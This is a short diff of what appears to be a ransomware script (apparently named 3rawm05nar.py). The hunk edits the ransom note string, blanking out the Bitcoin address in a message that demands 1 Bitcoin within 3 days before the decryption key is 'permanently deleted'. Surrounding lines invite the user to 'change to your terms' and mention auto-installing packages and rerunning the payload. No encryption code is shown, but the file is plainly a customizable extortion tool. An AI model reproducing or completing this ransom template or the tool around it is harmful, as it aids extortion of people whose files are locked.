@@ -30,7 +30,7 @@ f = []
 # Change to your terms
 
 stmt = \
-    "'Recover data locating the HOTreadME.txt in the directory where payload was initiated. The message reads, send 1 Bitcoin to the following address: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX . You have 3 days to send Bitcoin before the key is permanently deleted. Tick-Tock...Tick-Tock...'"
+    "'Recover data locating the HOTreadME.txt in the directory where payload was initiated. The message reads, send 1 Bitcoin to the following address:  . You have 3 days to send Bitcoin before the key is permanently deleted. Tick-Tock...Tick-Tock...'"
     
 # Try to see if module is present, if not, install packages and rerun 3rawm05nar.py on Windows. For Linux code may have to be ran again due to missing packages.
 
